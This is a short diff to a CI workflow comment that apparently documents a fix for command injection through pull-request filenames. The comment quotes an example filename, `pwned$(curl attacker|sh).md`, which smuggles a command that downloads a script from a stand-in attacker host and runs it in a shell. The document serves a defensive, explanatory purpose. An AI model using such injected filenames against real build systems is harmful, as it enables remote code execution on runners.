@@ -95,7 +95,7 @@ jobs:
           fi
           # EX-B-006: emit the file list as a NUL-delimited FILE, not a shell
           # value. The old code interpolated attacker-controlled filenames via
-          # `--files ${{ steps.added.outputs.files }}`, so a PR adding a file
+          # `--files <steps.added.outputs.files>`, so a PR adding a file
           # named `pwned$(curl attacker|sh).md` ran that command on the runner.
           # The consumer now reads this file with --files0; the only thing
           # interpolated downstream is the constant path we choose here.
